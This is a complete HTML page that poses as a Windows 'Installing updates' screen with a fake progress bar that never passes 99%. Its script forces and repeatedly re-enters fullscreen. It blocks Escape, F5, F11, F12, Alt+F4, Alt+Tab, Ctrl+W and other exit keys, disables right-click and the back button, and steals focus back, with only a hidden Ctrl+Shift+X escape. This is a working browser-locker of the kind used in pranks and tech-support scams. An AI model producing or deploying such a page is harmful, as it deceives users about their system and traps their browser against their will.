 <!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Windows Update</title>
<style>
  *{margin:0;padding:0}
  html,body{height:100%;width:100%;overflow:hidden;position:fixed;top:0;left:0;background:linear-gradient(135deg,#005a9e,#003f6b);color:#fff;font-family:'Segoe UI',sans-serif;cursor:wait;user-select:none}
  .c{text-align:center;padding:20vh 20px}
  .l{font-size:48px;margin-bottom:30px;animation:pulse 2s infinite}
  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05);opacity:.8}}
  h1{font-size:36px;font-weight:300;margin-bottom:10px}
  .s{font-size:16px;opacity:.7;margin-bottom:40px}
  .b{width:80%;max-width:480px;height:14px;background:rgba(255,255,255,.2);border-radius:12px;margin:0 auto;overflow:hidden}
  .f{height:100%;width:3%;background:#4db8ff;transition:width .5s}
  .p{margin-top:10px;font-family:monospace;font-size:14px}
  .i{margin-top:50px;font-size:13px;opacity:.5;line-height:1.6}
  .d{margin-top:30px}
  .d span{display:inline-block;width:10px;height:10px;background:rgba(255,255,255,.4);border-radius:50%;margin:0 3px;animation:dp 1.5s infinite}
  .d span:nth-child(2){animation-delay:.2s}
  .d span:nth-child(3){animation-delay:.4s}
  @keyframes dp{0%,80%,100%{transform:scale(.6);opacity:.3}40%{transform:scale(1);opacity:1}}
  .m{margin-top:20px;font-size:13px;opacity:.35;animation:fio 4s infinite}
  @keyframes fio{0%,100%{opacity:.35}50%{opacity:.7}}
</style>
</head>
<body>
<div class="c">
  <div class="l">⚙️</div>
  <h1>Installing updates</h1>
  <p class="s">Please wait a moment</p>
  <div class="b"><div class="f" id="f"></div></div>
  <p class="p" id="p">3%</p>
  <div class="d"><span></span><span></span><span></span></div>
  <p class="i">Your device may restart several times.<br><strong>Do not turn off your device.</strong></p>
  <p class="m" id="m">⏳ Checking for updates...</p>
</div>
<script>
(function(){var e=document.documentElement;if(e.requestFullscreen)e.requestFullscreen({navigationUI:'hide'}).catch(()=>{});else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen();else if(e.msRequestFullscreen)e.msRequestFullscreen()})();
document.addEventListener('keydown',function(e){if([27,122,116,123,18,9,91,92,93].includes(e.keyCode)||['Escape','F11','F5','F12','ContextMenu'].includes(e.key)){e.preventDefault();return false}if(e.ctrlKey&&['w','q','r','t','n','s','u'].includes(e.key.toLowerCase())){e.preventDefault();return false}if(e.altKey&&['F4','Tab'].includes(e.key)){e.preventDefault();return false}});
document.addEventListener('contextmenu',function(e){e.preventDefault()});
history.pushState(null,null,location.href);
window.addEventListener('popstate',function(){history.pushState(null,null,location.href)});
window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue=''});
document.addEventListener('visibilitychange',function(){if(document.hidden){setTimeout(function(){window.focus()},1)}});
window.addEventListener('blur',function(){setTimeout(function(){window.focus()},10)});
setInterval(function(){if(!document.fullscreenElement){var e=document.documentElement;if(e.requestFullscreen)e.requestFullscreen({navigationUI:'hide'}).catch(()=>{});else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen()}},500);
var p=3,ph=0,msgs=['⏳ Checking for updates...','📦 Downloading update 1 of 3...','⚙️ Applying updates...','🔄 Configuring system settings...','📦 Downloading update 2 of 3...','🔧 Installing component updates...','📦 Downloading update 3 of 3...','⚙️ Finalizing installation...','🔄 Preparing for restart...','⏳ Please wait...'];
function prog(){ph++;if(ph<10)p=3+ph*1.5;else if(ph<25)p=16+(ph-10)*1.2;else if(ph<45)p=34+(ph-25)*1;else if(ph<65)p=54+(ph-45)*0.8;else p=99;if(p>99)p=99;document.getElementById('f').style.width=p+'%';document.getElementById('p').textContent=Math.floor(p)+'%';document.getElementById('m').textContent=msgs[Math.min(Math.floor(ph/8),msgs.length-1)];setTimeout(prog,ph>40?2500:1000)}prog();
document.addEventListener('keydown',function(e){if(e.ctrlKey&&e.shiftKey&&e.key==='X'){if(document.exitFullscreen)document.exitFullscreen();else if(document.webkitExitFullscreen)document.webkitExitFullscreen();window.location.href='about:blank'}});
</script>
</body>
</html>
